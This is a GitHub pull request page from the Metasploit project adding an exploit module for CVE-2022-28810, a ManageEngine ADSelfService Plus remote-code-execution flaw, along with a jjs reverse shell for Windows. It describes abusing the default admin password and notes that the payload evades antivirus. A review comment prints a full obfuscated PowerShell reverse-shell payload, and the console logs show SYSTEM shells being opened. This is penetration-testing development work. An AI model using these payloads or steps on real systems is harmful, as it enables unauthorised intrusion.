=== Content from github.com_335ba101_20250108_125452.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16475)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16475)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.5k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  414](/rapid7/metasploit-framework/issues)
* [Pull requests
  35](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# ManageEngine ADSelfService Plus Authenticated RCE (CVE-2022-28810) #16475

 Merged

[smcintyre-r7](/smcintyre-r7)
merged 3 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[jbaines-r7:cve\_2022\_28810](/jbaines-r7/metasploit-framework/tree/cve_2022_28810 "jbaines-r7/metasploit-framework:cve_2022_28810")

Apr 20, 2022

 Merged

# [ManageEngine ADSelfService Plus Authenticated RCE (CVE-2022-28810)](#top) #16475

[smcintyre-r7](/smcintyre-r7)
merged 3 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[jbaines-r7:cve\_2022\_28810](/jbaines-r7/metasploit-framework/tree/cve_2022_28810 "jbaines-r7/metasploit-framework:cve_2022_28810")

Apr 20, 2022

[Conversation
13](/rapid7/metasploit-framework/pull/16475)
[Commits
3](/rapid7/metasploit-framework/pull/16475/commits)
[Checks
0](/rapid7/metasploit-framework/pull/16475/checks)
[Files changed](/rapid7/metasploit-framework/pull/16475/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=60&v=4)](/jbaines-r7)

Copy link

Contributor

### @jbaines-r7 **[jbaines-r7](/jbaines-r7)** commented [Apr 19, 2022](#issue-1208736140)

This is an implementation of an attack [Rapid7](https://www.rapid7.com/blog/post/2022/04/14/cve-2022-28810-manageengine-adselfservice-plus-authenticated-command-execution-fixed/) observed in the wild against ManageEngine ADSelfService Plus (ADSSP). Attackers were using the ADSSP's "custom script" functionality to execute arbitrary operating system commands whenever domain users reset their passwords. The "custom script" logic can only be accessed by the `admin` user, but `admin` has a default password (`admin`) that isn't getting changed as often as you'd hope.

The "custom script" functionality that this module abuses was removed in build 6122 to address [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"). The vendor worded [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") in such a way that it's unclear if they think the specific behavior this module abuses falls under the umbrella of [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"). But, since my name is associated with the CVE, I'm going to claim some type of authoritative knowledge and say, "Yes, fixing [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") is in part about preventing arbitrary command execution using custom scripts."

Anyway. There are a few of "interesting" things about this module because isn't there always?

## jjs is good

In the wild, the attacker was executing powershell to download stuff and whatever. Which is fine. But I thought this was a good opportunity to use `jjs` since ADSSP installs Java in tree and we always know where it is relative to our working directory. This was extra interesting because we didn't have a `jjs` reverse shell for Windows, and it is actually a good use for this vulnerability.

So this pull request also adds a reverse shell for Windows using jjs. It's almost entirely a copy and paste of [@bcoles](https://github.com/bcoles) work... to the point I didn't take any credit (there were a few minor tweaks but nothing to get all excited about). I enjoy `jjs` because the payload will execute "in memory" ish and Defender still seems not to give a hoot about it so you never have to mess around with builtin Windows AV. I actually published my own [jjs c2](https://github.com/jacob-baines/longtime-sunshine) a number of months before the cited links in the `jjs_reverse_tcp.rb` but I'm sure others did too. Either way, jjs is good. I'm very happy to use jjs here.

There's always the argument that the module should drop meterpeter but this is likely to be the more successful solution

## DisablePayloadHandler

This module sets `DisablePayloadHandler` to true and then starts it's own payload handler (code which was stolen almost wholesale from `windows/local/persistence.rb`). This is a side affect from the module requiring user interaction to execute the payload. The module is set to `passive` so it can wait in the background, but it will simply exit after a brief timeout if using the default payload handler. Hence controlling it's own handler is the solution.

## TARGET\_RESET

Exploitation leaves our payload in the custom script form, so I added an option that will simply clean up the target if the user specifies `true`. Again, due to the user interaction nature of this attack, there isn't a great time to clean everything up (it's not as simple as deleting a file), so I figured this was a reasonable solution. ü§∑

## Default port

By default this thing installs as HTTP on 8888. It can be configured to use HTTPs (9251 by default). I left the default port as 8888 with SSL set to false, but I think it's more likely that exploitable cases will be using HTTPs. Thoughts? Should I switch it over?

I've attached both video and pcap demonstrating exploitation. The video is worth a watch to understand what is happening, probably. The pcap should be useful for all of our signature writing friends (it's HTTP by default üò±). That's it.

## Verification

List the steps needed to make sure this thing works

* Follow the setup steps in the documentation
* Start `msfconsole`
* use exploit/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810`
* `set RHOST <ip>`
* `set LHOST <ip>`
* `check`
* Verify the remote host is vulnerable.
* `run`
* Verify the module is waiting for a reverse TCP connection
* Navigate to the ADSelfService Plus web UI and reset your test users password.
* After a new password has been set, verify the module received a reverse shell.
* Exit the shell
* Do `set TARGET_RESET true`
* Do `run`
* Navigate to the ADSelfService Plus web UI, log in as admin, and verify that the custom

  scripts have been removed and disabled ("Configuration" -> "Self Service" ->

  "Policy Configuration" -> "Advanced" -> "Password Sync")

## Video || GTFO

<https://www.youtube.com/watch?v=eQxth9FUkJE>

## PCAP || GTFO

[manageengine\_adssp\_reverse\_shell.zip](https://github.com/rapid7/metasploit-framework/files/8515239/manageengine_adssp_reverse_shell.zip)

Sorry, something went wrong.

 üëç
3
 smcintyre-r7, wvu, and Kr0ff reacted with thumbs up emoji

All reactions

* üëç
  3 reactions

 [jbaines-r7](/jbaines-r7)
added 2 commits
[April 19, 2022 10:33](#commits-pushed-ae54c8c)

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&v=4)](/jbaines-r7)

`[Initial implementation of authenticated RCE against ManageEngine ADSe‚Ä¶](/rapid7/metasploit-framework/pull/16475/commits/ae54c8c3d9e8ecb8bc29a601cdc57c91684d3a35 "Initial implementation of authenticated RCE against ManageEngine ADSelfService Plus (CVE-2022-28810)")`
 ‚Ä¶

`[ae54c8c](/rapid7/metasploit-framework/pull/16475/commits/ae54c8c3d9e8ecb8bc29a601cdc57c91684d3a35)`

```
‚Ä¶lfService Plus ([CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810"))
```

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&v=4)](/jbaines-r7)

`[Fixed the name of the jjs cmd](/rapid7/metasploit-framework/pull/16475/commits/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda "Fixed the name of the jjs cmd")`

`[c77e12e](/rapid7/metasploit-framework/pull/16475/commits/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda)`

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
self-assigned this
[Apr 19, 2022](#event-6457757153)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
added
[module](/rapid7/metasploit-framework/labels/module)
[docs](/rapid7/metasploit-framework/labels/docs)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
labels
[Apr 19, 2022](#event-6457769651)

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
requested changes
[Apr 19, 2022](#pullrequestreview-946199851)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda)

Copy link

Contributor

### @smcintyre-r7 **[smcintyre-r7](/smcintyre-r7)** left a comment ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Module is working great. The detailed setup steps were super helpful. I just left a few comments based on my review.

Testing Output
```
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. This determination is based on the version string: 6121.
[+] Authentication successful
[*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails
[*] Requesting policy details for msflab.local
[*] Payload: cmd.exe /c powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAMAnX2ICA5VVXW8aORR951dcoelmRgEL0HbVRkq17DRdRcq2qJNtHhBSjOcSZmNs1vYEUMJ/rz3j+SAkausH'+'{1}PteHx+fe2wvcsFMJgX8jaZ/g3P{1}MxQ{1}Oo8dsC3YMDiHz7jpf5n/h8xA/3q3xs90hXbQEJs'+'fF/lVMvlX40dc0JybW{1}FqIxnl2kIERuVYZ02U3O7Isww7'+'3hqpcjv7zqKiu'+'JYbVLZn2UERn1BFV2H5PU2Mys{2}dLIjlakVF2jsc{2}{2}RnUjwb/Cg3gkuaFqORx1SSodbgBVjJNOfoCP4ZRlCmZAsIq2Wgj/9Dd56JtBsVwXJeMZdn2qBAZSdPk539Xh{1}nWiLZPRpNrtn6ymfMfrfteCLRhir'+'j1vUrF1FfovNW3pgxXBsLWJYjLKnsX6Or8A{1}VxmP{1}NXSr5C8xjyd+oe7w/YgM/3hHhm/fk+HoXbfnduKX75QSaqOQrhzfEp5YqyXFmOXZMCwrVBJ0bun6gr{2}oac2{2}CuwVhshylZkdSarU0K/'+'fCxbWVtgLH4'+'Nri76HPtUwPZjzFVfSYIzKZIuMUYPfKM9S6rwXU87nlN3PougFOmScm6Uzrps01q9qE4ic817XcD0cd{2}2hNl4t'+'VLPRtpL{2}+c7gdDYL3L+z5ICQ0cC2pzePg70X{1}0V'+'ahcOpwa0hKJhMnd/PzsZJfHkZuQL85XLC7o01rtxomLijlSyRc1C5EDYbrDy5tubtwi'+'kEKB7OXE+4o39qx2yl6gC{2}q3VumuCtiOV6p7K7pYEwjuCfjCmp5cJALNVaqkJRAmO'+'3mEvSoNBiP2BKbsWt8Lb0cpAbWxsMm431Br2mQ65Q3Jll20fVoW476chIv6bS9HQ{1}VxbSyeIvBFLz/HWu1axPUl1QtrScS1DIRH3hNFkNbdfCg3s6ItVuyyutQoqeLsWD'+'vMf+xXZttdVW7xpl37bUZplxDMMgK1xXbuIr0jQsPdaDQQ+CA/YR9AXC4EjSC6cfptdWy9eeDH9OXQopNL7wmjco9rRRR6WF5q+LYneVqBBk0bNq2sPpinm0b+hXV18JPvrw2'+'xCe4Etu+iUqePMcQI2gEKQCPoW{2}SQIn9r/Q/0qywsMRmVCzdNEPcNKAbB2RAJWSajqYHSzWYl3ECeNIVRi9xOC83bFHbds5NvBP+beB+aFj24Y98ms15xPP9bJ+Df3F4+/2mEuNfj/FcazeqLZhmocrMXJdvVb+1zqzfujr2vkX6zsNqLftrggAAA{0}{0}')-f'=','G','T')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
[*] Enabling custom scripts and inserting the payload
[*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.159.128:4444

msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > [*] Powershell session session 3 opened (192.168.159.128:4444 -> 192.168.159.87:50092 ) at 2022-04-19 17:21:52 -0400

msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions -i 3
[*] Starting interaction with 3...

PS C:\ManageEngine\ADSelfService Plus\bin> exit

[*] 192.168.159.87 - Powershell session session 3 closed.  Reason: User exit
msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >

```

Sorry, something went wrong.

All reactions

[documentation/modules/exploit/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.md](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-ddda11c33d5c610d32bf8a3589c8f07c6d7560a9ecfb1b4a4e52b935f84f10ea)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/manageengine\_adselfservice\_plus\_cve\_2022\_28810.rb](/rapid7/metasploit-framework/pull/16475/files/c77e12e0c5ddce51bd9af92c9efc757eda2d2eda#diff-b4c0277b3a56016c787a6a359497b8309dcb1c79e244dae71155fc726e334337)
Outdated

Show resolved

Hide resolved

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&v=4)](/jbaines-r7)

`[Improve JSON cleanup, fix jjs specific wording, and moved JJS_PATH to‚Ä¶](/rapid7/metasploit-framework/pull/16475/commits/aba48a69058b1b385d2999255f3f53005ad4cde2 "Improve JSON cleanup, fix jjs specific wording, and moved JJS_PATH to defaultoptions")`
 ‚Ä¶

`[aba48a6](/rapid7/metasploit-framework/pull/16475/commits/aba48a69058b1b385d2999255f3f53005ad4cde2)`

```
‚Ä¶ defaultoptions
```

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=80&u=c5dc1f8c51eff0330bb7a5b2851cebaf5098d536&v=4)](/jbaines-r7)

Copy link

Contributor

Author

### **[jbaines-r7](/jbaines-r7)** commented [Apr 20, 2022](#issuecomment-1103932726)

| Updated to address all comments. Thanks for that bit of JSON clean-up code, Spencer! That makes this a bit less sketchy üòÑ  Retested:  ``` msf6 > use exploit/windows/http/manageengine_adselfservice_plus_cve_2022_28810 [*] Using configured payload cmd/windows/jjs_reverse_tcp msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set RHOST 10.0.0.20 RHOST => 10.0.0.20 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set LHOST 10.0.0.2 LHOST => 10.0.0.2 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > check [*] 10.0.0.20:8888 - The target appears to be vulnerable. This determination is based on the version string: 6121. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > run [*] Exploit running as background job 0.  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. This determination is based on the version string: 6121. [+] Authentication successful [*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails [*] Requesting policy details for okhuman.ninja [*] Enabling custom scripts and inserting the payload [*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.0.0.2:4444  [*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.20:50151 ) at 2022-04-20 06:24:15 -0700  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions 1 [*] Starting interaction with 1...   Shell Banner: M -----             C:\ManageEngine\ADSelfService Plus\bin>whoami whoami nt authority\system  C:\ManageEngine\ADSelfService Plus\bin>exit [*] 10.0.0.20 - Command shell session 1 closed. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set TARGET_RESET true TARGET_RESET => true msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > run [*] Exploit running as background job 2. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. This determination is based on the version string: 6121. [+] Authentication successful [*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails [*] Requesting policy details for okhuman.ninja [*] Disabling custom script functionality [*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails [+] Done!  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  ```  And manually verified the custom scripts fields were reset. |
| --- |

All reactions

Sorry, something went wrong.

 [![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=40&u=c5dc1f8c51eff0330bb7a5b2851cebaf5098d536&v=4)](/jbaines-r7)
[jbaines-r7](/jbaines-r7)
requested a review
from [smcintyre-r7](/smcintyre-r7)
[April 20, 2022 13:37](#event-6463261404)

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=80&u=99426fa1baf3d6e40a669942251d846cf81a9c25&v=4)](/wvu)

Copy link

Contributor

### **[wvu](/wvu)** commented [Apr 20, 2022](#issuecomment-1104243154)

| Yay, a `jjs` shell! |
| --- |

 ‚ù§Ô∏è
1
 jbaines-r7 reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  1 reaction

Sorry, something went wrong.

[smcintyre-r7](/smcintyre-r7)
added a commit
that referenced
this pull request
[Apr 20, 2022](#ref-commit-8e2bd3c)
[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

`[Land](/rapid7/metasploit-framework/commit/8e2bd3c5a94dd2e8c1e9aed42b9805fe83460410 "Land #16475, ManageEngine ADSelfService Plus RCE") [#16475](https://github.com/rapid7/metasploit-framework/pull/16475)[, ManageEngine ADSelfService Plus RCE](/rapid7/metasploit-framework/commit/8e2bd3c5a94dd2e8c1e9aed42b9805fe83460410 "Land #16475, ManageEngine ADSelfService Plus RCE")`

`[8e2bd3c](/rapid7/metasploit-framework/commit/8e2bd3c5a94dd2e8c1e9aed42b9805fe83460410)`

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)
[smcintyre-r7](/smcintyre-r7)
merged commit [`aba48a6`](/rapid7/metasploit-framework/commit/aba48a69058b1b385d2999255f3f53005ad4cde2)
into
rapid7:master

[Apr 20, 2022](https://github.com/rapid7/metasploit-framework/pull/16475#event-6465715116)

[![smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=60&v=4)](/smcintyre-r7)

**[smcintyre-r7](/smcintyre-r7)**
approved these changes
[Apr 20, 2022](#pullrequestreview-947658582)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16475/files/aba48a69058b1b385d2999255f3f53005ad4cde2)

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=80&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

Copy link

Contributor

### **[smcintyre-r7](/smcintyre-r7)** commented [Apr 20, 2022](#issuecomment-1104372022)

| Thanks for implementing those changes. I just retested the module and confirmed it's still working.  ```  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > set RHOSTS 192.168.159.87 RHOSTS => 192.168.159.87 msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > check [*] 192.168.159.87:8888 - The target appears to be vulnerable. This determination is based on the version string: 6121. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > exploit [*] Exploit running as background job 0. msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. This determination is based on the version string: 6121.  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  [+] Authentication successful [*] Requesting policy list from /ServletAPI/configuration/policyConfig/getPolicyConfigDetails [*] Requesting policy details for msflab.local [*] Enabling custom scripts and inserting the payload [*] Posting updated policy configuration to /ServletAPI/configuration/policyConfig/setAPCDetails [*] Starting exploit/multi/handler   [*] Started reverse TCP handler on 192.168.159.128:4444  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) >  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > [*] Command shell session 1 opened (192.168.159.128:4444 -> 192.168.159.87:58544 ) at 2022-04-20 15:20:39 -0400  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions  Active sessions ===============    Id  Name  Type               Information                                                                      Connection   --  ----  ----               -----------                                                                      ----------   1         shell cmd/windows  Shell Banner: Microsoft Windows [Version 10.0.19044.1645] (c) Microsoft Corp...  192.168.159.128:4444 -> 192.168.159.87:58544  (192.168.159.87)  msf6 exploit(windows/http/manageengine_adselfservice_plus_cve_2022_28810) > sessions -i -1 [*] Starting interaction with 1...   Shell Banner: Microsoft Windows [Version 10.0.19044.1645] (c) Microsoft Corporation. All rights reserved.  C:\ManageEngine\ADSelfService Plus\bin> -----            get uidC:\ManageEngine\ADSelfService Plus\bin> getuid 'getuid' is not recognized as an internal or external command, operable program or batch file.  C:\ManageEngine\ADSelfService Plus\bin>whoami whoami nt authority\system  C:\ManageEngine\ADSelfService Plus\bin>exit [*] 192.168.159.87 - Command shell session 1 closed.  ```  Merged! |
| --- |

 üéâ
1
 jbaines-r7 reacted with hooray emoji

All reactions

* üéâ
  1 reaction

Sorry, something went wrong.

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=80&u=898561ae7344081c10810bb0a4139c8e9724290d&v=4)](/smcintyre-r7)

Copy link

Contributor

### **[smcintyre-r7](/smcintyre-r7)** commented [Apr 20, 2022](#issuecomment-1104373148)

| Release Notes This adds an exploit for [CVE-2022-28810](https://github.com/advisories/GHSA-q392-qg7v-xvc4 "CVE-2022-28810") which is an authenticated RCE in ManageEngine ADSelfService Plus. |
| --- |

All reactions

Sorry, something went wrong.

[![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=40&v=4)](/jmartin-tech)
[jmartin-tech](/jmartin-tech)
mentioned this pull request
[Jun 15, 2022](#ref-pullrequest-1272646454)

[Fix missing and incomplete specs
#16679](/rapid7/metasploit-framework/pull/16679)
 Merged

1 task

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16475)

Reviewers

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7) [smcintyre-r7](/smcintyre-r7)

smcintyre-r7 approved these changes

Assignees

[![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=40&v=4)](/smcintyre-r7) [smcintyre-r7](/smcintyre-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@jbaines-r7](https://avatars.githubusercontent.com/u/91965877?s=52&v=4)](/jbaines-r7) [![@wvu](https://avatars.githubusercontent.com/u/4551878?s=52&v=4)](/wvu) [![@smcintyre-r7](https://avatars.githubusercontent.com/u/58950994?s=52&v=4)](/smcintyre-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
